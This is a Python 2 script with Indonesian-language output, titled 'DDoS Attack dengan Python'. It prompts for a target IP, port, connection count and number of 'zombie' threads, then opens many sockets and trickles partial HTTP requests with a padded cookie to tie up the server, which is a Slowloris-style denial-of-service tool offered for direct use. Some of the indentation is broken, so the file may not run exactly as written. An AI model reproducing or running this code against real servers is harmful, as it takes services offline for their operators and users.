import Queue
import socket
import thread
import threading
import time

print ("<< DDoS Attack dengan Python >>")
    hostx=raw_input( "Masukkan Host (IP Address) : " )
    portx=input( "Masukkan Port : " )
    connx=input( "Jumlah perulangan koneksi : " )
    thrdx=input( "Jumlah Max Thread Attacker (Zombie) : " )

def Pengaturan():
    return {
	   'host' : hostx,           
       'port' : portx,                         
       
       'maxattack' : connx,            
       'maxkoneksi' : connx,        
       'maxthread' : thrdx,             

       'keckoneksi' : 0.3,          
       'waktuantarthread' : 0.3,       
       'waktuantarkoneksi' : 1,   
       'terimapaket' : True,                
       'request' : ['GET / HTTP/1.1\r\nHost: www.example.com\r\nKeep-Alive: 300\r\nConnection: Keep-Alive\r\nReferer: http://www.demonstration.com/\r\n','User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.1.249.1045 Safari/532.5\r\n','Cookie: data1=' + ('A' * 100) + '&data2=' + ('A' * 100) + '&data3=' + ('A' * 100) + '\r\n'],                 
    }

class dosAttack(threading.Thread):
    options = {}

    running = False
    attacks = 0
    threads = 0
    sockets = 0

    def __init__(self):
        threading.Thread.__init__(self)
        self.koneksi = Queue.Queue()
        self.pengaturan = Pengaturan()
 	
    def run(self):
        print 'Script Mulai'
        self.running = True

        thread.start_new_thread(self.buat_sockets, ())

        for id in range(self.pengaturan['maxthread']):
            thread.start_new_thread(self.attack, (id,))
            self.threads += 1
            if self.pengaturan['waktuantarthread'] > 0:
                time.sleep(self.pengaturan['waktuantarthread'])

    def buat_sockets(self):
        print 'Pembuatan Socket dimulai.'
        count = 0
        while (self.pengaturan['maxattack'] > self.attacks) and self.running:
            if self.pengaturan['maxkoneksi'] > self.sockets:

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                try:
                    s.connect((self.pengaturan['host'], self.pengaturan['port']))
                    
                    goder = self.running
                    nama = self.pengaturan['host']
                    porte = self.pengaturan['port']	
                    keckon = self.sockets

                    self.koneksi.put((s, 0))
                    
                    print 'Socket %s terbuka' % (goder)
                    print 'Host : %s:%s' % (nama,porte)
                    print 'Koneksi [%s] dibuat.' % (keckon)
                    
                    self.attacks += 1
                    self.sockets += 1
                
                except Exception, ex:
                    print 'Tidak dapat tersambung ke %s.' % (ex)
                    print "Jumlah koneksi socket saat ini : ",self.koneksi.qsize() 

            if self.pengaturan['waktuantarkoneksi'] > 0:
                time.sleep(self.pengaturan['waktuantarkoneksi'])
                print 'Pembuatan socket selesai.'

    def attack(self, id):
        print 'Attack thread %i dimulai' % (id)
        
        while self.running:
            
            (s, index) = self.koneksi.get()
        
            try:
                if len(self.pengaturan['request']) > index:
                    s.send(self.pengaturan['request'][index])
                    index += 1
                    self.koneksi.put((s, index))
                
                elif self.pengaturan['terimapaket'] == True:
                    data = s.recv(1024)

                    if not len(data):
                        s.close()
                        print 'Socket ditutup, transfer data selesai.'
                        self.sockets -= 1
                    else:
                        self.koneksi.put((s, index))
                else:
                    s.close()
                    print 'Socket ditutup.'
                    self.sockets -= 1
            
            except Exception, ex:
                print 'Socket ditutup, %s terjadi.' % (ex)
                s.close()
                self.sockets -= 1
	    
            if self.sockets == 0 and self.attacks == self.pengaturan['maxattack']:
                print 'Max Attack %s. Koneksi Mati !' % (connx)
                self.running = False
            
            elif self.sockets > 0 and self.pengaturan['keckoneksi'] > 0:
                
                time.sleep(1 / self.pengaturan['keckoneksi'] / self.sockets * self.threads)
            elif self.pengaturan['keckoneksi'] > 0:
                
                time.sleep(1 / self.pengaturan['keckoneksi'] * self.threads)
        
        print 'Attack thread %i selesai.' % (id)
        self.threads -= 1

class JalanDos(dosAttack):
    def __init__(self):
        self.options = Pengaturan()
        dosAttack.__init__(self)

    def mainloop(self):
        self.start()
        time.sleep(1)
        while self.running:
            pass
        print 'Script Selesai'
 
#--- start panggil fungsi dan jalankan object ---#
s = JalanDos()
s.mainloop()
#--- end ---#


